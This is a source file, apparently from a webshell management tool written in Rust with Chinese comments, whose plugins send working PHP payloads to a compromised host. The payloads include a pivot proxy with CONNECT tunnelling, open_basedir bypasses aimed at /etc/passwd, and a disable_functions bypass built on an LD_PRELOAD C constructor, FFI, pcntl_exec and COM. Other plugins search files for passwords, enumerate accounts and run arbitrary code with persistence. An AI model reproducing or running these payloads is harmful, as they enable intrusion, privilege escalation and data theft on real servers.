    @file_put_contents($pidFile, getmypid());
}}
$srv = @stream_socket_server('tcp://0.0.0.0:' . $port, $errno, $errstr, STREAM_SERVER_BIND | STREAM_SERVER_LISTEN);
if (!$srv) {{ echo json_encode(array('ok' => false, 'error' => $errstr)); return; }}
$deadline = time() + $window;
while (time() < $deadline) {{
    $conn = @stream_socket_accept($srv, 3);
    if (!$conn) continue;
    $req = @fgets($conn);
    if ($req === false) {{ fclose($conn); continue; }}
    if (preg_match('/^CONNECT\s+([^:\s]+):(\d+)\s+HTTP/i', $req, $m)) {{
        $remote = @stream_socket_client('tcp://' . $m[1] . ':' . $m[2], $e1, $e2, 8);
        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
        @fwrite($conn, 'HTTP/1.1 200 Connection established\r\n\r\n');
        @stream_set_blocking($conn, false);
        @stream_set_blocking($remote, false);
        $start = time();
        while (time() - $start < 240) {{
            $r = array($conn, $remote); $w = null; $x = null;
            $n = @stream_select($r, $w, $x, 1);
            if ($n === false) break;
            foreach ($r as $sock) {{
                $data = @fread($sock, 8192);
                if ($data === '' && @feof($sock)) break 2;
                if ($data !== '' && $data !== false) {{
                    $target = ($sock === $conn) ? $remote : $conn;
                    @fwrite($target, $data);
                }}
            }}
        }}
        @fclose($conn);
        @fclose($remote);
    }} elseif (preg_match('/^(\w+)\s+(\S+)\s+HTTP/i', $req, $m2)) {{
        $url = @parse_url($m2[2]);
        if (!isset($url['host'])) {{ @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n'); fclose($conn); continue; }}
        $rport = isset($url['port']) ? $url['port'] : (($url['scheme'] === 'https') ? 443 : 80);
        $remote = @stream_socket_client('tcp://' . $url['host'] . ':' . $rport, $e1, $e2, 8);
        if (!$remote) {{ @fwrite($conn, 'HTTP/1.1 502 Bad Gateway\r\n\r\n'); fclose($conn); continue; }}
        $path = (isset($url['path']) ? $url['path'] : '/') . (isset($url['query']) ? '?' . $url['query'] : '');
        $rewrite = $m2[1] . ' ' . $path . ' HTTP/1.1\r\n';
        @fwrite($remote, $rewrite);
        $body = '';
        while (($line = @fgets($conn)) !== false) {{
            if (trim($line) === '') break;
            if (preg_match('/^Host:/i', $line)) continue;
            @fwrite($remote, $line);
        }}
        @fwrite($remote, 'Host: ' . $url['host'] . ':' . $rport . "\r\n\r\n");
        if (preg_match('/content-length:\s*(\d+)/i', $body_headers ?? '')) {{}}
        $cl = 0;
        @stream_set_blocking($conn, false);
        $start = time();
        while (time() - $start < 60) {{
            $data = @fread($conn, 8192);
            if ($data === '' && @feof($conn)) break;
            if ($data !== '' && $data !== false) @fwrite($remote, $data);
            $resp = @fread($remote, 8192);
            if ($resp !== '' && $resp !== false) @fwrite($conn, $resp);
            usleep(20000);
        }}
        @fclose($conn);
        @fclose($remote);
    }} else {{
        @fwrite($conn, 'HTTP/1.1 400 Bad Request\r\n\r\n');
        fclose($conn);
    }}
}}
if ($pid === 0) echo json_encode(array('ok' => true, 'mode' => 'foreground', 'port' => $port, 'window' => $window));
"#,
        port = port,
        window = window_secs,
    )
}

/// HTTP 代理（通用：PHP 载荷，绝对 URL 转发 + CONNECT 隧道）。
pub struct HttpProxyPlugin;

impl FeaturePlugin for HttpProxyPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "http_proxy".into(),
            name: "HTTP 代理".into(),
            version: "1.0.0".into(),
            description: "在目标主机启动 HTTP 代理（绝对 URL 转发 + CONNECT 隧道）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "port".into(),
                    label: "监听端口".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(8080)),
                    options: None,
                },
                ParamSpec {
                    name: "window".into(),
                    label: "存活窗口（秒）".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(600)),
                    options: None,
                },
                ParamSpec {
                    name: "action".into(),
                    label: "操作".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("start")),
                    options: Some(vec!["start".to_string(), "stop".to_string()]),
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let port = param_int(params, "port", 8080).clamp(1024, 65535);
                let window = param_int(params, "window", 600).clamp(30, 3600);
                let action = param_str(params, "action", "start");
                let code = php_http_proxy_code(port, window, &action);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "HTTP 代理暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// ByPassOpenBasedir（PHP 专用：symlink + glob 经典绕过）
// ---------------------------------------------------------------------------

fn php_bypass_open_basedir_code(
    target: &str,
    method: &str,
    recursive: bool,
    write_data: &str,
) -> String {
    format!(
        r#"<?php
error_reporting(0);
$target = {target};
$method = {method};
$recursive = {recursive};
$writeB64 = {write_data};
$base = sys_get_temp_dir();
$out = array('open_basedir' => ini_get('open_basedir'), 'php_version' => PHP_VERSION,
    'methods' => array(), 'method_used' => $method, 'ok' => false, 'error' => null,
    'entries' => null, 'read' => null, 'content' => null);
$ob = ini_get('open_basedir');

// ---------- 环境探测：各绕过方法在当前环境是否可用 ----------
// symlink 指向受限外（/etc 或 / 探测，失败说明受限检查生效）
$probe = $base . '/.dsw_p_' . mt_rand();
$out['methods']['symlink'] = (bool)@symlink($base, $probe);
if ($out['methods']['symlink']) @unlink($probe);
$out['methods']['symlink_out'] = (bool)@symlink('/etc', $base . '/.dsw_po_' . mt_rand());
if ($out['methods']['symlink_out']) @unlink($base . '/.dsw_po_' . mt_rand());
// chdir 到受限外（低版本 PHP 允许 chdir 后配合相对路径 ini_set）
$out['methods']['chdir'] = (bool)@chdir('/');
if (!$out['methods']['chdir']) @chdir($base);
// ini_set 覆盖 open_basedir（PHP 5.x / 7.0-7.2 部分场景生效）
$out['methods']['ini_set'] = false;
if (@ini_set('open_basedir', '/') !== false && ini_get('open_basedir') === '/') {{
    $out['methods']['ini_set'] = true;
    @ini_set('open_basedir', $ob);
}}
// glob 是否直通受限（老版本 glob 不检查 open_basedir）
$out['methods']['glob_pass'] = count(@glob('/etc/*') ?: array()) > 0;

$isDir = @is_dir($target);
$targetDir = $isDir ? $target : @dirname($target);
$targetFile = $isDir ? '' : $target;

if ($ob === false || $ob === '') {{
    // open_basedir 未启用：直接读取/列举，无需绕过
    $out['note'] = 'open_basedir 未启用';
    $out['method_used'] = 'direct';
    if ($targetFile !== '') {{
        $c = @file_get_contents($targetFile);
        $out['ok'] = ($c !== false);
        if ($out['ok']) {{ $out['read'] = base64_encode($c); $out['content'] = $c; }}
        else $out['error'] = '读取失败';
    }} else {{
        $out['entries'] = @scandir($targetDir);
        $out['ok'] = is_array($out['entries']);
        if (!$out['ok']) $out['error'] = '列举失败';
    }}
    echo json_encode($out); return;
}}

$m = $method;
if ($m === 'auto') {{
    if ($out['methods']['symlink_out'] || $out['methods']['symlink']) $m = 'symlink';
    elseif ($out['methods']['chdir']) $m = 'chdir_ini';
    elseif ($out['methods']['ini_set']) $m = 'ini_set';
    else $m = 'none';
}}
$out['method_used'] = $m;

if ($m === 'symlink') {{
    // 方法 1：symlink 指向受限外目录 + glob / 直读
    $okAny = false;
    if ($targetFile !== '') {{
        $link = $base . '/.dsw_f_' . mt_rand() . '_' . mt_rand();
        if (@symlink($targetFile, $link)) {{
            $c = @file_get_contents($link);
            if ($c !== false) {{
                $out['ok'] = true; $okAny = true;
                $out['read'] = base64_encode($c); $out['content'] = $c;
            }}
            @unlink($link);
        }}
    }} else {{
        $link = $base . '/.dsw_d_' . mt_rand() . '_' . mt_rand();
        if (@symlink($targetDir, $link)) {{
            $entries = @glob($link . '/*');
            if (count($entries ?: array()) === 0) {{
                // 二级 symlink 链（部分环境需二次链接）
                $l2 = $base . '/.dsw_l2_' . mt_rand() . '_' . mt_rand();
                if (@symlink($link, $l2)) {{
                    $entries = @glob($l2 . '/*');
                    @unlink($l2);
                }}
            }}
            $names = array();
            foreach ($entries as $e) $names[] = basename($e);
            $out['entries'] = $names; $out['ok'] = true; $okAny = true;
            @unlink($link);
        }}
    }}
    if (!$okAny) {{
        $out['error'] = 'symlink 链接被 open_basedir 拦截（PHP 7.3+ 已修复，需低版本或特定配置）';
        // 尝试直读（不通过 symlink，纯 glob 直通路径）
        if (!$isDir && count(@glob('/etc/*') ?: array()) > 0) {{
            $c = @file_get_contents($target);
            if ($c !== false) {{ $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c; $out['error'] = null; }}
        }}
    }}
}} elseif ($m === 'chdir_ini') {{
    // 方法 2：chdir 到目标目录 + ini_set 相对路径（PHP < 7.3）
    @chdir($targetDir);
    $r = @ini_set('open_basedir', '..');
    $c = @file_get_contents($targetFile);
    if ($c !== false) {{
        $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c;
        if (!$isDir) {{ }}
    }} else {{
        $out['error'] = 'chdir + ini_set 相对路径无效（PHP 7.3+ 已修复）';
    }}
    @ini_set('open_basedir', $ob);
}} elseif ($m === 'ini_set') {{
    // 方法 3：ini_set 直接覆盖（PHP 5.x / 低版本）
    $r = @ini_set('open_basedir', '/');
    if (ini_get('open_basedir') === '/') {{
        $c = @file_get_contents($target);
        if ($c !== false) {{
            $out['ok'] = true; $out['read'] = base64_encode($c); $out['content'] = $c;
            if (!$isDir) {{ }}
        }}
    }}
    if (!$out['ok']) $out['error'] = 'ini_set 覆盖 open_basedir 无效（高版本受限）';
    @ini_set('open_basedir', $ob);
}} else {{
    // 无可用方法：报告评估结论
    $out['error'] = '当前环境无法绕过 open_basedir（symlink/chdir/ini_set 均被拦截或高版本修复）';
}}

echo json_encode($out);
"#,
        target = serde_json::to_string(target).unwrap_or_else(|_| "\"/etc/passwd\"".to_string()),
        method = serde_json::to_string(method).unwrap_or_else(|_| "\"auto\"".to_string()),
        recursive = if recursive { "true" } else { "false" },
        write_data = serde_json::to_string(write_data).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// ByPassOpenBasedir（PHP 专用）：symlink + glob 经典绕过读取受限文件。
pub struct BypassOpenBasedirPlugin;

impl FeaturePlugin for BypassOpenBasedirPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_open_basedir".into(),
            name: "ByPassOpenBasedir".into(),
            version: "2.0.0".into(),
            description: "open_basedir 环境探测 + 多方法绕过：symlink+glob 列举 / symlink 直读 / chdir+ini_set（PHP<7.3）/ ini_set 覆盖（低版本）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![
                ParamSpec {
                    name: "path".into(),
                    label: "目标路径".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("/etc/passwd")),
                    options: None,
                },
                ParamSpec {
                    name: "method".into(),
                    label: "绕过方法".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("auto")),
                    options: Some(vec![
                        "auto".to_string(),
                        "symlink".to_string(),
                        "chdir_ini".to_string(),
                        "ini_set".to_string(),
                    ]),
                },
                ParamSpec {
                    name: "recursive".into(),
                    label: "递归列举目录".into(),
                    param_type: "bool".into(),
                    default: Some(serde_json::json!(false)),
                    options: None,
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "ByPassOpenBasedir 仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        let target = param_str(params, "path", "/etc/passwd");
        let method = param_str(params, "method", "auto");
        let recursive = param_bool(params, "recursive", false);
        let write_data = param_str(params, "write_data", "");
        let code = php_bypass_open_basedir_code(&target, &method, recursive, &write_data);
        let output = protocol.run_code(session, "php", &code, settings)?;
        serde_json::from_str(&output)
            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
    }
}

// ---------------------------------------------------------------------------
// BypassDisableFunctions（PHP 专用：LD_PRELOAD + mail 经典绕过）
// ---------------------------------------------------------------------------

/// LD_PRELOAD 载荷（C 源码，由目标编译器现场编译）。
const BYPASS_C_PAYLOAD: &str = r#"#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
__attribute__((constructor)) static void dsw_entry(void) {
    unsetenv("LD_PRELOAD");
    const char *c = getenv("EVIL_CMD");
    if (c) execl("/bin/sh", "sh", "-c", c, (char *)0);
}
"#;

fn php_bypass_disable_functions_code(command: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$cmd = {command};
$out = array('disabled' => ini_get('disable_functions'), 'detected' => array(), 'vectors' => array(), 'result' => null);
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$has = function ($fn) use ($disabled) {{
    return function_exists($fn) && !in_array($fn, $disabled);
}};
foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'putenv', 'mail', 'error_log', 'dl', 'FFI', 'iconv', 'pcntl_fork', 'pcntl_waitpid') as $fn) {{
    $out['detected'][$fn] = $has($fn);
}}
$tmp = sys_get_temp_dir();
$of = $tmp . '/.dsw_bypass_' . mt_rand() . '_' . mt_rand() . '.txt';

// ===== 向量 1：FFI（PHP 7.4+，无需编译器，直接调 libc） =====
if (PHP_VERSION_ID >= 70400 && class_exists('FFI') && !in_array('FFI', $disabled)) {{
    try {{
        $lib = null;
        foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/lib/libc.dylib') as $l) {{
            try {{ $ffi = FFI::cdef("FILE *popen(const char *, const char *); char *fgets(char *, int, FILE *); int pclose(FILE *); int system(const char *);", $l); $lib = $l; break; }}
            catch (Throwable $e) {{ continue; }}
        }}
        if ($lib !== null) {{
            $fp = $ffi->popen($cmd . ' 2>&1', 'r');
            if ($fp !== null) {{
                $output = '';
                $buf = $ffi->new("char[4096]");
                while ($ffi->fgets($buf, 4095, $fp) !== null) {{ $output .= FFI::string($buf); }}
                $ffi->pclose($fp);
                $out['vectors']['ffi'] = array('ok' => true, 'lib' => $lib, 'output' => base64_encode($output));
                $out['result'] = $output;
            }} else {{
                // popen 失败：退回 system + 临时文件
                $ffi->system($cmd . ' > ' . $of . ' 2>&1');
                if (file_exists($of)) {{
                    $output = @file_get_contents($of);
                    @unlink($of);
                    $out['vectors']['ffi'] = array('ok' => true, 'method' => 'system', 'output' => base64_encode($output));
                    $out['result'] = $output;
                }}
            }}
        }}
    }} catch (Throwable $e) {{
        $out['vectors']['ffi'] = array('ok' => false, 'error' => $e->getMessage());
    }}
}}

// ===== 向量 2：pcntl_exec（fork 子进程执行） =====
if (!isset($out['result']) && $has('pcntl_exec') && $has('pcntl_fork') && $has('pcntl_waitpid')) {{
    try {{
        $pid = pcntl_fork();
        if ($pid === 0) {{
            pcntl_exec('/bin/sh', array('-c', $cmd . ' > ' . $of . ' 2>&1'));
            exit;
        }}
        if ($pid > 0) {{
            pcntl_waitpid($pid, $status);
            $output = file_exists($of) ? @file_get_contents($of) : '';
            @unlink($of);
            $out['vectors']['pcntl_exec'] = array('ok' => true, 'output' => base64_encode((string)$output));
            $out['result'] = $output;
        }}
    }} catch (Throwable $e) {{
        $out['vectors']['pcntl_exec'] = array('ok' => false, 'error' => $e->getMessage());
    }}
}}

// ===== 向量 3：COM / .NET（Windows） =====
if (!isset($out['result']) && PHP_OS_FAMILY === 'Windows' && class_exists('COM')) {{
    try {{
        $wsh = new COM('WScript.Shell');
        $wsh->Run('cmd /c ' . $cmd . ' > ' . $of . ' 2>&1', 0, true);
        $output = file_exists($of) ? @file_get_contents($of) : '';
        @unlink($of);
        $out['vectors']['com'] = array('ok' => true, 'output' => base64_encode((string)$output));
        $out['result'] = $output;
    }} catch (Throwable $e) {{
        $out['vectors']['com'] = array('ok' => false, 'error' => $e->getMessage());
    }}
}}

// ===== 向量 4：LD_PRELOAD（编译器 + sendmail 触发） =====
if (!isset($out['result'])) {{
    $cc = null;
    foreach (array('gcc', 'cc', 'clang') as $c) {{
        $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
        if (trim((string)$p)) {{ $cc = trim($p); break; }}
    }}
    $out['compiler'] = $cc;
    $sendmail = (string)ini_get('sendmail_path');
    if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
    $hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
    $out['sendmail'] = $hasSendmail ? $sendmail : null;
    $hasShell = $has('shell_exec') || $has('exec') || $has('system');
    if ($cc && $has('putenv') && ($has('mail') || $has('error_log')) && $hasShell && $hasSendmail) {{
        $so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
        $cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
        $c = <<<'C'
__C_PAYLOAD__
C;
        @file_put_contents($cf, $c);
        $built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
        if (file_exists($so)) {{
            @putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
            @putenv('LD_PRELOAD=' . $so);
            if ($has('mail')) {{ @mail('a@b.c', '', ''); }}
            else {{ @error_log('', 1); }}
            @putenv('LD_PRELOAD=');
            $output = file_exists($of) ? @file_get_contents($of) : '';
            $out['vectors']['ld_preload'] = array('ok' => true, 'output' => base64_encode((string)$output));
            $out['result'] = $output;
            @unlink($so);
            @unlink($cf);
            @unlink($of);
        }} else {{
            $out['vectors']['ld_preload'] = array('ok' => false, 'error' => 'compile failed: ' . (string)$built);
        }}
    }} else {{
        $out['vectors']['ld_preload'] = array('ok' => false,
            'error' => '缺少条件：编译器(' . ($cc ?: '无') . ') sendmail(' . ($hasSendmail ? '有' : '无') . ') putenv/mail/exec');
    }}
}}

if (isset($out['result']) && $out['result'] === '') {{
    $out['result'] = null;
    $out['note'] = '命令执行成功但无输出';
}}
echo json_encode($out);
"#,
        command = serde_json::to_string(command).unwrap_or_else(|_| "\"id\"".to_string()),
    )
    .replace("__C_PAYLOAD__", BYPASS_C_PAYLOAD)
}/// BypassDisableFunctions（PHP 专用）：LD_PRELOAD + mail 经典绕过。
pub struct BypassDisableFunctionsPlugin;

impl FeaturePlugin for BypassDisableFunctionsPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_disable_functions".into(),
            name: "BypassDisableFunctions".into(),
            version: "1.0.0".into(),
            description: "检测禁用函数环境并通过 LD_PRELOAD + mail 触发执行命令。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![ParamSpec {
                name: "command".into(),
                label: "要执行的命令".into(),
                param_type: "string".into(),
                default: Some(serde_json::json!("id")),
                options: None,
            }],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "BypassDisableFunctions 仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        let command = param_str(params, "command", "id");
        let code = php_bypass_disable_functions_code(&command);
        let output = protocol.run_code(session, "php", &code, settings)?;
        serde_json::from_str(&output)
            .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
    }
}

// ---------------------------------------------------------------------------
// 文件搜索（通用，PHP 代码型：文件名/内容匹配）
// ---------------------------------------------------------------------------
fn php_file_search_code(dir: &str, keyword: &str, in_content: bool, max_depth: u32) -> String {
    format!(
        r#"<?php
error_reporting(0);
$root = {dir};
$kw = {keyword};
$inContent = {content};
$maxDepth = {depth};
$out = array('root' => $root, 'scanned' => 0, 'matches' => array());
$it = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST
);
$it->setMaxDepth($maxDepth);
foreach ($it as $f) {{
    if (!$f->isFile()) continue;
    $out['scanned']++;
    if ($out['scanned'] > 20000) break;
    $size = $f->getSize();
    if ($size > 5000000) continue;
    $hit = false;
    if ($inContent) {{
        $content = @file_get_contents($f->getRealPath());
        $hit = $content !== false && strpos($content, $kw) !== false;
    }} else {{
        $hit = stripos($f->getFilename(), $kw) !== false;
    }}
    if ($hit && count($out['matches']) < 200) {{
        $out['matches'][] = array('path' => $f->getRealPath(), 'size' => $size,
            'name' => $f->getFilename(), 'mtime' => $f->getMTime());
    }}
}}
echo json_encode($out);
"#,
        dir = serde_json::to_string(dir).unwrap_or_else(|_| "\".\"".to_string()),
        keyword = serde_json::to_string(keyword).unwrap_or_else(|_| "\"\"".to_string()),
        content = if in_content { "true" } else { "false" },
        depth = max_depth,
    )
}

/// 文件搜索（通用）：文件名或内容关键字匹配。
pub struct FileSearchPlugin;

impl FeaturePlugin for FileSearchPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "file_search".into(),
            name: "文件搜索".into(),
            version: "1.0.0".into(),
            description: "递归搜索目标目录：按文件名或文件内容关键字匹配。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "dir".into(),
                    label: "搜索目录".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!(".")),
                    options: None,
                },
                ParamSpec {
                    name: "keyword".into(),
                    label: "关键字".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("password")),
                    options: None,
                },
                ParamSpec {
                    name: "in_content".into(),
                    label: "匹配文件内容".into(),
                    param_type: "bool".into(),
                    default: Some(serde_json::json!(false)),
                    options: None,
                },
                ParamSpec {
                    name: "max_depth".into(),
                    label: "最大深度".into(),
                    param_type: "int".into(),
                    default: Some(serde_json::json!(4)),
                    options: None,
                },
            ],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let dir = param_str(params, "dir", ".");
                let keyword = param_str(params, "keyword", "");
                let in_content = param_bool(params, "in_content", false);
                let depth = param_int(params, "max_depth", 4).clamp(1, 8);
                let code = php_file_search_code(&dir, &keyword, in_content, depth);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "文件搜索暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 网络信息（通用，命令型：多语言命令模板）
// ---------------------------------------------------------------------------

fn netinfo_command(language: &str) -> &'static str {
    match language {
        "aspnet" | "asp" => "ipconfig /all 2>nul & netstat -an 2>nul",
        _ => "ifconfig 2>/dev/null || ip addr 2>/dev/null; echo ---; netstat -tunap 2>/dev/null | head -40 || netstat -an 2>/dev/null | head -40",
    }
}

/// 网络信息（通用）：网卡 / 连接 / 路由。
pub struct NetInfoPlugin;

impl FeaturePlugin for NetInfoPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "netinfo".into(),
            name: "网络信息".into(),
            version: "1.0.0".into(),
            description: "收集网卡、活动连接与路由信息（按语言选择命令）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        _params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        run_command(protocol, session, netinfo_command(runtime), settings)
    }
}

// ---------------------------------------------------------------------------
// 用户枚举（通用，命令型）
// ---------------------------------------------------------------------------

fn userlist_command(language: &str) -> &'static str {
    match language {
        "aspnet" | "asp" => "net user 2>nul & echo --- & whoami 2>nul",
        _ => "cat /etc/passwd 2>/dev/null | head -60; echo ---; whoami 2>/dev/null; id 2>/dev/null",
    }
}

/// 用户枚举（通用）：账户列表 + 当前用户。
pub struct UserListPlugin;

impl FeaturePlugin for UserListPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "userlist".into(),
            name: "用户枚举".into(),
            version: "1.0.0".into(),
            description: "枚举系统账户与当前身份（按语言选择命令）。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        _params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        run_command(protocol, session, userlist_command(runtime), settings)
    }
}

// ---------------------------------------------------------------------------
// 加解密工具（通用，PHP 代码型：AES-256/XOR 文本加解密）
// ---------------------------------------------------------------------------

fn php_crypto_tool_code(op: &str, algorithm: &str, text: &str, pass: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$op = {op};
$algo = {algorithm};
$text = {text};
$pass = {pass};
$key = hash('sha256', $pass, true);
if ($op === 'encrypt') {{
    if ($algo === 'aes') {{
        $iv = substr($key, 0, 16);
        $padded = $text . str_repeat(chr(16 - (strlen($text) % 16)), 16 - (strlen($text) % 16));
        $out = base64_encode(openssl_encrypt($text, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv));
    }} else {{
        $k = hash('md5', $pass);
        $out = base64_encode($text ^ str_repeat($k, intdiv(strlen($text), strlen($k)) + 1));
    }}
}} else {{
    if ($algo === 'aes') {{
        $iv = substr($key, 0, 16);
        $out = openssl_decrypt(base64_decode($text), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        $out = $out === false ? '(解密失败)' : rtrim($out, "\x00..\x10");
    }} else {{
        $k = hash('md5', $pass);
        $raw = base64_decode($text);
        $out = $raw ^ str_repeat($k, intdiv(strlen($raw), strlen($k)) + 1);
    }}
}}
echo json_encode(array('ok' => true, 'op' => $op, 'algo' => $algo, 'result' => $out));
"#,
        op = serde_json::to_string(op).unwrap_or_else(|_| "\"encrypt\"".to_string()),
        algorithm = serde_json::to_string(algorithm).unwrap_or_else(|_| "\"aes\"".to_string()),
        text = serde_json::to_string(text).unwrap_or_else(|_| "\"\"".to_string()),
        pass = serde_json::to_string(pass).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// 加解密工具（加密器类型）：AES-256-CBC / XOR 文本加解密。
pub struct CryptoToolPlugin;

impl FeaturePlugin for CryptoToolPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "crypto_tool".into(),
            name: "加解密工具".into(),
            version: "1.0.0".into(),
            description: "在目标上执行文本加解密（AES-256-CBC / MD5-XOR），结果即时查看。".into(),
            category: "general".into(),
            languages: vec![],
            params: vec![
                ParamSpec {
                    name: "op".into(),
                    label: "操作".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("encrypt")),
                    options: Some(vec!["encrypt".into(), "decrypt".into()]),
                },
                ParamSpec {
                    name: "algorithm".into(),
                    label: "算法".into(),
                    param_type: "select".into(),
                    default: Some(serde_json::json!("aes")),
                    options: Some(vec!["aes".into(), "xor".into()]),
                },
                ParamSpec {
                    name: "text".into(),
                    label: "文本".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("hello")),
                    options: None,
                },
                ParamSpec {
                    name: "pass".into(),
                    label: "口令".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("secret")),
                    options: None,
                },
            ],
            kind: "crypto".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        match runtime {
            "php" => {
                let op = param_str(params, "op", "encrypt");
                let algorithm = param_str(params, "algorithm", "aes");
                let text = param_str(params, "text", "");
                let pass = param_str(params, "pass", "");
                let code = php_crypto_tool_code(&op, &algorithm, &text, &pass);
                let output = protocol.run_code(session, "php", &code, settings)?;
                serde_json::from_str(&output).map_err(|_| {
                    ProtocolError::ParseError(format!("载荷输出非 JSON：{output}"))
                })
            }
            other => Err(ProtocolError::NotSupported(format!(
                "加解密工具暂不支持运行时 {other}"
            ))),
        }
    }
}

// ---------------------------------------------------------------------------
// 代码加载器（加载器类型）：执行 PHP 代码 + 可选写入持久化文件
// ---------------------------------------------------------------------------

fn php_code_loader_code(code: &str, persist_path: &str) -> String {
    format!(
        r#"<?php
error_reporting(0);
$persist = {path};
if ($persist !== '') {{
    $script = '<?php ' . '{code_esc}' . ' ?>';
    $w = @file_put_contents($persist, $script);
}}
ob_start();
try {{
{code_raw}
}} catch (Exception $e) {{
    echo (string)$e;
}}
$output = ob_get_clean();
echo json_encode(array('ok' => true, 'persisted' => $persist !== '' && isset($w) && $w !== false,
    'persist_path' => $persist, 'output' => $output));
"#,
        code_raw = code,
        code_esc = code.replace("\\", "\\\\").replace("'", "\\'"),
        path = serde_json::to_string(persist_path).unwrap_or_else(|_| "\"\"".to_string()),
    )
}

/// 代码加载器（加载器类型）：任意 PHP 代码执行 + 可选落盘持久化。
pub struct CodeLoaderPlugin;

impl FeaturePlugin for CodeLoaderPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "php_code_loader".into(),
            name: "代码加载器".into(),
            version: "1.0.0".into(),
            description: "执行任意 PHP 代码；可同时写入持久化脚本（加载器）。".into(),
